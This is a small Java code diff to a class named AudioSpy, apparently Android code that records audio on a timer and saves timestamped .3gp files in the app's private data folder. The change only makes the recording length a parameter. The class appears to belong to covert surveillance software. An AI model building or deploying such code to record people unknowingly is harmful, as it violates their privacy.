@@ -39,12 +39,12 @@ public class AudioSpy {
         timer.start();
     }
 
-    static void writeAudio(Context context){
+    static void writeAudio(Context context, int time){
         DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.US);
         Date date = new Date();
 
         String filePrefix = context.getApplicationInfo().dataDir + "/audio-";
 
-        recordAudio(filePrefix + formatter.format(date) + ".3gp", 15);
+        recordAudio(filePrefix + formatter.format(date) + ".3gp", time);
     }
 }
